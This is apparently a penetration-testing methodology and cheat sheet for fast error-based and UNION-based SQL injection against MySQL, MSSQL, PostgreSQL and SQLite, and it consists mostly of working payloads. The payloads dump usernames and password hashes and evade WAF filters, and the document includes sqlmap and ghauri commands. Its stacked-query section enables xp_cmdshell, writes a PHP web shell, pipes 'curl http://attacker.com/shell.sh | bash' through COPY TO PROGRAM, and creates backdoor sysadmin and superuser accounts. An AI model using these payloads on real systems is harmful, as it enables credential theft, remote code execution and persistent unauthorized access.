# Fast SQL Injection Techniques — Error-Based and UNION-Based

Speed-optimized SQL injection methodology for authorized penetration tests and CTF. Covers error-based and UNION-based extraction across MySQL, MSSQL, PostgreSQL, and SQLite — the two fastest technique classes that require the fewest requests and deliver data in HTTP responses rather than timing channels.

**Scope:** Authorized engagements only. For blind/time-based techniques see `sqli-specialist`. For full database extraction after access see `database-dumping-techniques`.

---

## 1. Technique Selection

Choose your technique before sending a payload:

```
Response shows DB error message?
├── YES → Error-based (fastest, fewest requests)
└── NO → Is a second result row visible in the response?
    ├── YES → UNION-based (fast, data in-band)
    └── NO → Stacked queries available? (MSSQL, PostgreSQL)
        ├── YES → Stacked + error/OOB hybrid
        └── NO → Time-based blind (slowest — use sqli-specialist)
```

**Speed ranking:** Error-based ≈ UNION-based >> Stacked >> Boolean blind >> Time-based

---

## 2. MySQL / MariaDB Error-Based

Error-based injection extracts data by forcing the database to embed it inside an error message that the application reflects back.

### 2.1 extractvalue() — Primary MySQL Error Technique

Works on MySQL 5.1+ and MariaDB. Triggers an XPATH error with data in the message.

```sql
-- Basic syntax (returns up to 32 chars per query)
AND extractvalue(1, concat(0x7e, <subquery>))-- -

-- Current database
AND extractvalue(1, concat(0x7e, database()))-- -

-- MySQL version
AND extractvalue(1, concat(0x7e, version()))-- -

-- Current user
AND extractvalue(1, concat(0x7e, user()))-- -

-- List databases
AND extractvalue(1, concat(0x7e, (SELECT schema_name FROM information_schema.schemata LIMIT 1 OFFSET 0)))-- -
AND extractvalue(1, concat(0x7e, (SELECT schema_name FROM information_schema.schemata LIMIT 1 OFFSET 1)))-- -

-- List tables
AND extractvalue(1, concat(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1 OFFSET 0)))-- -

-- List columns
AND extractvalue(1, concat(0x7e, (SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1 OFFSET 0)))-- -

-- Extract data (concat username:password in one call)
AND extractvalue(1, concat(0x7e, (SELECT concat(username,0x3a,password) FROM users LIMIT 1 OFFSET 0)))-- -

-- Handle 32-char truncation with substring
AND extractvalue(1, concat(0x7e, substring((SELECT password FROM users WHERE username='admin'),1,32)))-- -
AND extractvalue(1, concat(0x7e, substring((SELECT password FROM users WHERE username='admin'),33,32)))-- -
```

**Output appears as:** `XPATH syntax error: '~admin:5f4dcc3b5aa765d61d8327deb882cf99'`

### 2.2 updatexml() — Alternative MySQL Error Technique

Functionally identical to extractvalue, different function signature:

```sql
AND updatexml(1, concat(0x7e, (SELECT database())), 1)-- -
AND updatexml(1, concat(0x7e, (SELECT concat(username,0x3a,password) FROM users LIMIT 1 OFFSET 0)), 1)-- -

-- Bypass 32-char limit
AND updatexml(1, concat(0x7e, mid((SELECT password FROM users WHERE username='admin'),1,30)), 1)-- -
```

### 2.3 floor(rand()) — Group By Error

Works even when extractvalue/updatexml are filtered. More complex but powerful:

```sql
AND (SELECT 1 FROM (SELECT count(*),concat((SELECT database()),floor(rand(0)*2)) x FROM information_schema.tables GROUP BY x) a)-- -

-- General template (replace the subquery)
AND (SELECT 1 FROM (SELECT count(*),concat((<SUBQUERY>),floor(rand(0)*2)) x FROM information_schema.tables GROUP BY x) a)-- -

-- Example: dump user credentials
AND (SELECT 1 FROM (SELECT count(*),concat((SELECT concat(username,0x3a,password) FROM users LIMIT 1),floor(rand(0)*2)) x FROM information_schema.tables GROUP BY x) a)-- -
```

**Output appears as:** `Duplicate entry 'admin:password_hash1'`

### 2.4 GeomFromText() — MySQL Spatial Error

Alternative for MySQL 5.x when above are filtered:

```sql
AND geometrycollection((select * from (select * from (select concat(username,0x3a,password) from users)a)b))-- -
AND polygon((select * from (select (select concat(username,0x3a,password) from users limit 1))x))-- -
```

### 2.5 MySQL Double-Query Error via NAME_CONST

Works on older MySQL versions:

```sql
AND (SELECT * FROM (SELECT NAME_CONST(database(),1),NAME_CONST(database(),1))x)-- -
```

---

## 3. MSSQL Error-Based

### 3.1 convert() / CAST() — Primary MSSQL Error Technique

MSSQL raises a conversion error that includes the data value when you try to cast a string to an integer:

```sql
-- Basic convert technique
AND 1=convert(int, (SELECT TOP 1 db_name()))-- -
AND 1=convert(int, (SELECT TOP 1 table_name FROM information_schema.tables))-- -
AND 1=convert(int, (SELECT TOP 1 username+':'+password_hash FROM users))-- -

-- CAST equivalent
AND 1=CAST((SELECT TOP 1 username FROM users) AS int)-- -
AND 1=CAST(db_name() AS int)-- -

-- With string concat for multiple fields
AND 1=convert(int, (SELECT TOP 1 username+0x3a+password_hash FROM users))-- -

-- Paginate through rows (skip already-seen values)
AND 1=convert(int, (SELECT TOP 1 username FROM users WHERE username NOT IN ('admin')))-- -
AND 1=convert(int, (SELECT TOP 1 username FROM users WHERE username NOT IN ('admin','user2')))-- -
```

**Output appears as:** `Conversion failed when converting the nvarchar value 'admin:hash' to data type int.`

### 3.2 MSSQL String Truncation Error

```sql
-- Trigger truncation error with data
AND 1=(SELECT 1/0 WHERE 1=(SELECT CASE WHEN (SELECT TOP 1 username FROM users)='admin' THEN 1 ELSE 0 END))-- -

-- Force arithmetic error with data embedded
AND 1=(SELECT 1 WHERE (1/0) = (SELECT LEN(username) FROM users WHERE username='admin'))-- -
```

### 3.3 MSSQL Enumeration via Error

```sql
-- Current database
AND 1=convert(int, db_name())-- -

-- All databases
AND 1=convert(int, (SELECT name FROM master..sysdatabases WHERE dbid=1))-- -
AND 1=convert(int, (SELECT name FROM master..sysdatabases WHERE dbid=2))-- -

-- Tables in current DB
AND 1=convert(int, (SELECT TOP 1 name FROM sysobjects WHERE xtype='U'))-- -

-- Columns
AND 1=convert(int, (SELECT TOP 1 column_name FROM information_schema.columns WHERE table_name='users'))-- -

-- Current user and privilege check
AND 1=convert(int, system_user)-- -
AND 1=convert(int, IS_SRVROLEMEMBER('sysadmin'))-- -
```

---

## 4. PostgreSQL Error-Based

### 4.1 CAST() — Primary PostgreSQL Error Technique

```sql
-- Cast string to integer forces error with data
AND 1=cast((SELECT version()) as int)-- -
AND 1=cast((SELECT current_database()) as int)-- -
AND 1=cast((SELECT username FROM users LIMIT 1) as int)-- -
AND 1=cast((SELECT username||':'||password FROM users LIMIT 1 OFFSET 0) as int)-- -

-- Paginate
AND 1=cast((SELECT username||':'||password FROM users LIMIT 1 OFFSET 1) as int)-- -
```

**Output appears as:** `ERROR: invalid input syntax for type integer: "admin:5f4dcc3b"`

### 4.2 array_to_string() Error Technique

```sql
-- Force error via invalid function argument
AND 1=1/(SELECT CASE WHEN (SELECT count(*) FROM users)>0 THEN 0 ELSE 1 END)-- -

-- Use DO block for advanced extraction (requires superuser)
AND 1=cast($$SELECT$$||version() as int)-- -
```

### 4.3 PostgreSQL Enumeration

```sql
-- Databases (schemas in PostgreSQL parlance)
AND 1=cast((SELECT datname FROM pg_database LIMIT 1 OFFSET 0) as int)-- -

-- Tables
AND 1=cast((SELECT tablename FROM pg_tables WHERE schemaname='public' LIMIT 1 OFFSET 0) as int)-- -

-- Columns
AND 1=cast((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1 OFFSET 0) as int)-- -

-- Current user and superuser check
AND 1=cast(current_user as int)-- -
AND 1=cast((SELECT usesuper::text FROM pg_user WHERE usename=current_user) as int)-- -
```

---

## 5. UNION-Based Injection

### 5.1 Column Count Detection (Fastest Methods)

**Method 1 — ORDER BY (binary search, fewest requests):**
```sql
ORDER BY 1-- -        -- works → at least 1 column
ORDER BY 8-- -        -- error → fewer than 8 columns
ORDER BY 4-- -        -- binary search: 4 works, 8 fails → try 6
ORDER BY 6-- -        -- error → try 5
ORDER BY 5-- -        -- works → 5 columns confirmed
```

**Method 2 — UNION NULL (direct):**
```sql
UNION SELECT NULL-- -
UNION SELECT NULL,NULL-- -
UNION SELECT NULL,NULL,NULL-- -
-- First one that doesn't error = column count
```

**Binary search optimization:** Start at 8, halve the space each time. Finds count in ≤4 requests for tables up to 16 columns.

### 5.2 String Column Identification

After finding column count, identify which columns accept strings (for data output):

```sql
-- Replace each NULL with a string marker
UNION SELECT 'a',NULL,NULL-- -    -- error? column 1 is not string
UNION SELECT NULL,'a',NULL-- -    -- works? column 2 is string ← use this
UNION SELECT NULL,NULL,'a'-- -
```

**Fast version:** Try all at once with a unique marker:
```sql
UNION SELECT 'FUZZ1','FUZZ2','FUZZ3'-- -
-- Whichever appears in the response = that column index
```

### 5.3 MySQL UNION Data Extraction

```sql
-- Template (confirmed 3 columns, col 2 is string output):
UNION SELECT NULL,<payload>,NULL-- -

-- Database and version
UNION SELECT NULL,concat(database(),0x7c,version()),NULL-- -

-- All databases
UNION SELECT NULL,schema_name,NULL FROM information_schema.schemata-- -

-- Tables
UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_schema='targetdb'-- -

-- Columns
UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'-- -

-- Data extraction (concat to maximize per-row yield)
UNION SELECT NULL,concat(username,0x3a,password),NULL FROM users-- -

-- All rows at once with group_concat
UNION SELECT NULL,group_concat(username,0x3a,password SEPARATOR 0x7c),NULL FROM users-- -
-- Output: admin:hash1|user2:hash2|user3:hash3
```

**group_concat limit:** Default MySQL `group_concat_max_len` = 1024 bytes. For large datasets:
```sql
-- Paginate instead
UNION SELECT NULL,concat(username,0x3a,password),NULL FROM users LIMIT 10 OFFSET 0-- -
UNION SELECT NULL,concat(username,0x3a,password),NULL FROM users LIMIT 10 OFFSET 10-- -
```

### 5.4 MSSQL UNION Data Extraction

```sql
-- MSSQL-specific: use TOP instead of LIMIT
UNION SELECT TOP 1 NULL,table_name,NULL FROM information_schema.tables-- -

-- Paginate with NOT IN
UNION SELECT TOP 1 NULL,table_name,NULL FROM information_schema.tables WHERE table_name NOT IN ('known_table1')-- -

-- Data
UNION SELECT TOP 1 NULL,username+':'+password_hash,NULL FROM users-- -

-- All rows: MSSQL has no group_concat — use XML PATH trick
UNION SELECT NULL,(SELECT username+':'+password_hash+'|' FROM users FOR XML PATH('')),NULL-- -
```

### 5.5 PostgreSQL UNION Data Extraction

```sql
-- Basic
UNION SELECT NULL,current_database(),NULL-- -

-- Tables
UNION SELECT NULL,tablename,NULL FROM pg_tables WHERE schemaname='public' LIMIT 1 OFFSET 0-- -

-- Data
UNION SELECT NULL,username||':'||password,NULL FROM users LIMIT 1 OFFSET 0-- -

-- All rows at once (string_agg equivalent of group_concat)
UNION SELECT NULL,(SELECT string_agg(username||':'||password,'|') FROM users),NULL-- -
```

### 5.6 SQLite UNION Data Extraction

```sql
-- Tables (SQLite-specific system table)
UNION SELECT NULL,name,NULL FROM sqlite_master WHERE type='table'-- -

-- Schema (get column names)
UNION SELECT NULL,sql,NULL FROM sqlite_master WHERE name='users'-- -

-- Data
UNION SELECT NULL,username||':'||password,NULL FROM users LIMIT 1 OFFSET 0-- -
```

---

## 6. Stacked Queries

Stacked queries (multiple statements separated by `;`) allow executing arbitrary SQL beyond SELECT-only contexts. Support varies by DBMS and driver.

### 6.1 Support Matrix

| DBMS | Stacked Queries | Notes |
|---|---|---|
| MySQL | Limited | Depends on PHP `mysqli_multi_query` or PDO |
| MSSQL | Yes | Full support via `xp_cmdshell`, `exec`, etc. |
| PostgreSQL | Yes | Full support |
| SQLite | Limited | Depends on driver |
| Oracle | No | Use `EXECUTE IMMEDIATE` in PL/SQL blocks |

### 6.2 MSSQL Stacked Queries

```sql
-- Enable xp_cmdshell
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE;--
'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;--

-- OS command execution
'; EXEC xp_cmdshell 'ping attacker.com';--
'; EXEC xp_cmdshell 'whoami > C:\Users\Public\out.txt';--

-- Insert admin user (if app has users table)
'; INSERT INTO users (username,password,role) VALUES ('attacker','5f4dcc3b','admin');--

-- Create new login (sysadmin required)
'; EXEC sp_addlogin 'attacker','Password123!';--
'; EXEC sp_addsrvrolemember 'attacker','sysadmin';--
```

### 6.3 PostgreSQL Stacked Queries

```sql
-- Write file via COPY (superuser required)
'; COPY (SELECT '<?php system($_GET[cmd]); ?>') TO '/var/www/html/shell.php';--

-- Execute OS command via COPY TO PROGRAM
'; COPY (SELECT '') TO PROGRAM 'curl http://attacker.com/shell.sh | bash';--

-- Create superuser
'; CREATE USER attacker WITH SUPERUSER PASSWORD 'Password123';--
```

---

## 7. Performance Optimization

### 7.1 Minimize Requests

**Use group_concat / string_agg to get all rows in one request:**
```sql
-- MySQL: all creds in one shot
UNION SELECT NULL,group_concat(username,0x3a,password),NULL FROM users-- -

-- PostgreSQL: all creds in one shot
UNION SELECT NULL,(SELECT string_agg(username||':'||password,'|') FROM users),NULL-- -

-- MSSQL: all creds in one shot
UNION SELECT NULL,(SELECT username+':'+password+'|' FROM users FOR XML PATH('')),NULL-- -
```

**Use concat to get version+db+user in one call:**
```sql
UNION SELECT NULL,concat(version(),0x7c,database(),0x7c,user()),NULL-- -
```

### 7.2 Binary Search for Column Count

For a table with up to 16 columns, binary search finds it in 4 requests maximum:
```
Request 1: ORDER BY 8  → error → <8
Request 2: ORDER BY 4  → works → 4-7
Request 3: ORDER BY 6  → error → 4-5
Request 4: ORDER BY 5  → works → 5 columns ✓
```

### 7.3 Skip information_schema on MySQL (Bypass WAF + Speed)

`information_schema` is a common WAF keyword filter. Alternatives:

```sql
-- MySQL 5.7+: performance_schema
SELECT table_name FROM performance_schema.tables WHERE table_schema=database()-- -

-- MySQL: mysql.innodb_table_stats (no schema filter needed)
SELECT database_name, table_name FROM mysql.innodb_table_stats-- -

-- sys schema (MySQL 5.7+)
SELECT * FROM sys.schema_table_statistics-- -

-- MySQL 8.0+: information_schema.tables still works but use DICT_ tables
SELECT table_name FROM mysql.tables WHERE schema='targetdb'-- -
```

---

## 8. Tool-Assisted Fast Injection

### 8.1 sqlmap — Error and UNION Technique Flags

```bash
# Force UNION technique only
sqlmap -u "http://target.com/page?id=1" --technique=U --batch

# Force error-based only
sqlmap -u "http://target.com/page?id=1" --technique=E --batch

# Both error + UNION (fastest combo, no time-based)
sqlmap -u "http://target.com/page?id=1" --technique=EU --batch

# Specify UNION columns directly (skip detection if known)
sqlmap -u "http://target.com/page?id=1" --technique=U --union-cols=5 --batch

# UNION column character (use -- if NULLs not working)
sqlmap -u "http://target.com/page?id=1" --technique=U --union-char='a' --batch

# Full chain: error+UNION, dump users table
sqlmap -u "http://target.com/page?id=1" --technique=EU -D targetdb -T users --dump --batch

# POST data with auth
sqlmap -u "http://target.com/search" --data="q=1" --technique=EU --cookie="session=abc" --dump --batch

# Level 3 for more injection points, risk 2 for more tests
sqlmap -u "http://target.com/page?id=1" --technique=EU --level=3 --risk=2 --dump
```

### 8.2 ghauri — Error-Based Mode

```bash
# Install
pip install ghauri

# Error-based
ghauri -u "http://target.com/page?id=1" --technique=E --dbs

# UNION-based
ghauri -u "http://target.com/page?id=1" --technique=U --dbs

# Both
ghauri -u "http://target.com/page?id=1" --technique=EU -D targetdb -T users --dump

# POST
ghauri -u "http://target.com/login" --data="username=1&password=test" --technique=EU --dump
```

### 8.3 Manual Testing Workflow (Burp Suite)

1. Send request to Repeater
2. Append `'` → check for SQL error (confirms injection point)
3. Try `ORDER BY 1-- -`, increment until error → get column count
4. Try `UNION SELECT NULL,NULL,NULL-- -` with correct count
5. Replace NULLs with string markers to find output column
6. Run data extraction payloads in output column
7. For error-based: try `extractvalue(1,concat(0x7e,database()))-- -` directly

---

## 9. Filter and WAF Bypass for Error/UNION

### 9.1 Comment Variations

```sql
-- Standard
-- -
#
/*comment*/

-- Inline (whitespace bypass)
UNION/**/SELECT/**/NULL,database(),NULL-- -

-- URL-encoded space alternatives
UNION%09SELECT%09NULL,database(),NULL-- -  (tab)
UNION%0ASELECT%0ANULL,database(),NULL-- -  (newline)
```

### 9.2 Keyword Case and Encoding

```sql
-- Case variation
uNiOn SeLeCt NULL,database(),NULL-- -
UNION%20select%20null,database(),null-- -

-- Double URL encoding
UNION%2520SELECT  (double-encode the space)

-- Hex string literals (bypass string filters)
UNION SELECT NULL,0x61646d696e,NULL-- -  (0x61646d696e = 'admin')
```

### 9.3 Bypass information_schema Filters

```sql
-- Alternative for MySQL
UNION SELECT NULL,table_name,NULL FROM mysql.innodb_table_stats WHERE database_name=database()-- -

-- Alternative for MSSQL
UNION SELECT NULL,name,NULL FROM sysobjects WHERE xtype='U'-- -

-- Alternative for PostgreSQL
UNION SELECT NULL,tablename,NULL FROM pg_tables WHERE schemaname='public'-- -
```

---

## 10. Quick Reference Cheatsheet

### MySQL Error-Based One-Liners

```sql
-- DB name
AND extractvalue(1,concat(0x7e,database()))-- -
-- Tables
AND extractvalue(1,concat(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1)))-- -
-- Dump row
AND extractvalue(1,concat(0x7e,(SELECT concat(username,0x3a,password) FROM users LIMIT 1)))-- -
```

### MSSQL Error-Based One-Liners

```sql
-- DB name
AND 1=convert(int,db_name())-- -
-- Tables
AND 1=convert(int,(SELECT TOP 1 table_name FROM information_schema.tables))-- -
-- Dump row
AND 1=convert(int,(SELECT TOP 1 username+':'+password FROM users))-- -
```

### PostgreSQL Error-Based One-Liners

```sql
-- DB name
AND 1=cast(current_database() as int)-- -
-- Tables
AND 1=cast((SELECT tablename FROM pg_tables WHERE schemaname='public' LIMIT 1) as int)-- -
-- Dump row
AND 1=cast((SELECT username||':'||password FROM users LIMIT 1) as int)-- -
```

### UNION All-In-One (MySQL, 3 columns, col 2 visible)

```sql
UNION SELECT NULL,group_concat(schema_name),NULL FROM information_schema.schemata-- -
UNION SELECT NULL,group_concat(table_name),NULL FROM information_schema.tables WHERE table_schema=database()-- -
UNION SELECT NULL,group_concat(column_name),NULL FROM information_schema.columns WHERE table_name='users'-- -
UNION SELECT NULL,group_concat(username,0x3a,password),NULL FROM users-- -
```

---

## 11. References

- PayloadsAllTheThings SQL Injection: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
- sqlmap techniques documentation: https://sqlmap.org/
- ghauri: https://github.com/r0oth3x49/ghauri
- PortSwigger SQL Injection Cheat Sheet: https://portswigger.net/web-security/sql-injection/cheat-sheet
- OWASP SQL Injection Testing: https://owasp.org/www-project-web-security-testing-guide/
- HackTricks SQL Injection: https://book.hacktricks.xyz/pentesting-web/sql-injection
